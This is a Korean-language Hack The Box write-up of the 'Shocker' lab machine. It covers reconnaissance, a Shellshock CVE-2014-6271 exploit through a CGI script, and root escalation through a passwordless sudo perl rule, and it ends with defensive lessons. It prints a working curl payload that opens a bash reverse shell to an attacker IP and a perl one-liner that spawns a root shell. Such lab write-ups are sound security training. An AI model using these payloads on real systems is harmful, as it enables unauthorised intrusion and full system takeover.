# HTB - Shocker

## 머신 정보

|항목|내용|
|---|---|
|이름|Shocker|
|난이도|Easy|
|OS|Linux (Ubuntu)|
|IP|10.129.191.82|
|주요 취약점|Shellshock (CVE-2014-6271)|
|Privesc|sudo perl NOPASSWD|
|태그|`Shellshock` `CGI` `Bash` `Perl` `sudo` `Linux`|

---

## 공격 흐름 요약

```
nmap 포트 스캔
→ 80 (HTTP), 2222 (SSH)
→ gobuster로 /cgi-bin/ 발견
→ gobuster로 user.sh 발견
→ Shellshock (CVE-2014-6271) 공격
→ shelly 유저 리버스쉘 획득
→ sudo -l → perl NOPASSWD
→ sudo perl로 root 획득
```

---

## 1. 정찰 (Reconnaissance)

### 1.1 Nmap 포트 스캔

```bash
nmap -p- --min-rate 10000 -T4 10.129.191.82
```

**결과:**

|PORT|SERVICE|
|---|---|
|80/tcp|HTTP|
|2222/tcp|SSH|

> 2222 포트 = 비표준 SSH 포트

### 1.2 웹 서비스 확인

```bash
curl http://10.129.191.82/
```

### 1.3 디렉토리 스캔

```bash
gobuster dir -u http://10.129.191.82/ \
-w /usr/share/wordlists/dirb/common.txt
```

→ `/cgi-bin/` 디렉토리 발견

### 1.4 CGI 스크립트 스캔

```bash
gobuster dir -u http://10.129.191.82/cgi-bin/ \
-w /usr/share/wordlists/dirb/common.txt \
-x sh,pl,cgi,py
```

→ `user.sh` 발견

### 1.5 스크립트 확인

```bash
curl http://10.129.191.82/cgi-bin/user.sh
```

**결과:**

```
Content-Type: text/plain

Just an uptime test script
05:20:12 up 10 min, 1 user, load average: 0.00, 0.01, 0.00
```

→ `uptime` 명령어 출력 → Bash 스크립트 → **Shellshock 취약**

---

## 2. 취약점 분석

### Shellshock (CVE-2014-6271)

|항목|내용|
|---|---|
|CVE|**CVE-2014-6271**|
|이름|**Shellshock**|
|취약점|Bash 환경변수 처리 버그|
|공격 벡터|Apache CGI HTTP 헤더|
|PoC|`() { :; }; sleep 10`|
|영향|원격 코드 실행 (RCE)|

HTTP 헤더(User-Agent 등)에 Bash 함수 정의 + 명령어 삽입 → CGI 스크립트 실행 시 명령어 자동 실행.

---

## 3. 초기 접근 (Initial Access)

### 3.1 nc 리스너 실행

```bash
nc -lvnp 4444
```

### 3.2 Shellshock 리버스쉘

```bash
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.17.240/4444 0>&1" \
http://10.129.191.82/cgi-bin/user.sh
```

→ **nc에 shelly 유저 쉘 연결!**

```bash
shelly@Shocker:/usr/lib/cgi-bin$ whoami
shelly
```

---

## 4. User Flag

```bash
cat /home/shelly/user.txt
```

---

## 5. 권한 상승 (Privilege Escalation)

### 5.1 sudo 권한 확인

```bash
sudo -l
```

**결과:**

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

→ 패스워드 없이 **perl을 root로 실행 가능!**

### 5.2 perl로 root 쉘 획득

```bash
sudo perl -e 'exec "/bin/bash";'
```

→ **root 쉘 획득!**

```bash
whoami
root
```

---

## 6. Root Flag

```bash
cat /root/root.txt
```

---

## 7. 정리 및 교훈

### 취약점 체인

```
CGI 스크립트 노출 (/cgi-bin/user.sh)
→ Shellshock으로 RCE
→ shelly 유저 쉘 획득
→ sudo perl NOPASSWD
→ root 권한 획득
```

### 핵심 교훈

- **CGI 스크립트** 사용 시 Shellshock 패치 필수
- **sudo NOPASSWD** 설정은 위험 → 특히 perl/python/ruby 같은 언어는 쉘 실행 가능
- **비표준 포트** (2222) 사용해도 보안에 도움 안됨
- `sudo -l` 은 Privesc 첫 번째로 확인해야 할 명령어

### GTFOBins - perl sudo 권한 상승

```bash
# sudo perl로 root 쉘
sudo perl -e 'exec "/bin/bash";'

# 또는
sudo perl -e 'exec "/bin/sh";'
```

> GTFOBins (https://gtfobins.github.io) 에서 sudo 가능한 바이너리별 Privesc 방법 확인 가능

---

## 참고

| 항목                         | 링크                                             |
| -------------------------- | ---------------------------------------------- |
| CVE-2014-6271 (Shellshock) | https://nvd.nist.gov/vuln/detail/CVE-2014-6271 |
| GTFOBins perl              | https://gtfobins.github.io/gtfobins/perl/      |
| Exploit-DB Shellshock      | https://www.exploit-db.com/exploits/34900      |